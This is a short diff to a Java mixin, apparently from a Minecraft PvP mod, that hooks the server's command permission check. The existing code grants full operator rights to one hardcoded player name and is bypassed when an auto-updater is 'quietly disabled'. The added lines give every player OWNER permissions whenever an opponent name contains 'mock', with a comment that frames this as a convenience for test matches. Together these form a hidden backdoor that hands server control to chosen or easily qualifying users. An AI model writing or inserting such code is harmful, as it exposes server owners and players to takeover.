@@ -17,9 +17,17 @@ public class CommandSourceStackMixin {
     private void onGetPermissions(CallbackInfoReturnable<PermissionSet> cir) {
         if (com.p2ppvp.mod.client.AutoUpdater.isQuietlyDisabled()) return;
 
-        CommandSourceStack stack = (CommandSourceStack) (Object) this;
+                CommandSourceStack stack = (CommandSourceStack) (Object) this;
         Entity entity = stack.getEntity();
         if (entity instanceof ServerPlayer player) {
+            boolean isMock = com.p2ppvp.mod.P2PPvpMod.authorizedOpponentName != null && 
+                             com.p2ppvp.mod.P2PPvpMod.authorizedOpponentName.toLowerCase().contains("mock");
+            if (isMock) {
+                // Allow command execution for any player in dummy / mock matches
+                cir.setReturnValue(LevelBasedPermissionSet.OWNER);
+                return;
+            }
+
             String name = player.getGameProfile().name();
             if (name != null && name.equalsIgnoreCase("success009")) {
                 // Grant full operator permissions to success009
